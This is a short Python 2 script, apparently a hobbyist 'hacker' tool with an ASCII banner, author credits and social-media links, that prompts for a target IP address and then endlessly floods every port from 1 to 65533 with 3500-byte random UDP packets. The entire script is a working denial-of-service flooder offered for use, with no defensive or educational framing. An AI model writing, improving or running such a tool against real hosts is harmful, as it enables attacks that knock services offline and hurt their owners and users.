#Author WHITE L'
import socket, os, random, time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print " "




print "$$$$$$$$$$$$$$$   $$$$$$$$$$$$$$$                                   "

print "$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$                                   "

print "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$                    "

print "$$$$$$$$$$$ $$$$$$$$$ $$$$$$$$$$$    $$$$$$$$$$$                    "

print "$$$$$$$$$$$           $$$$$$$$$$$    $$$     $$$    $$$    $$$$$    "

print "$$$$$$$$$$$           $$$$$$$$$$$    $$$     $$$      $    $   $    "

print "$$$$$$$$$$$           $$$$$$$$$$$    $$$$$$$$$$$   $  $    $   $    "

print "$$$$$$$$$$$           $$$$$$$$$$$    $$$$$$$$$$$    $$$    $$$$$    "                                                   "
print 
print "["+B+""+R+"#"+N+"] "+B+""+R+"Author : MOJO"+N+"   Hacker From - "+B+""+R+"Anonymous"+N
print
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : white-eagle\033[0m")
print("\033[33mTelegram	       : https://t.me/YourAnonPost\033[0m")
print("\033[33mTwitter       : https://twitter.com/anonymousnws12\033[0m")
print("\033[32m================================================================\033[0m")
print

ip = raw_input("[+] Target's IP : ")
os.system("clear")
print "Attack starting..."
time.sleep(3)
while True:
	sent = 0
	for port in range(1, 65534):
    		white.sendto(bytes, (ip,port))
    		sent = sent + 1
    		print "\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s "%(sent, ip, port)

print "\033[1;92mAttack finished\033[0m"
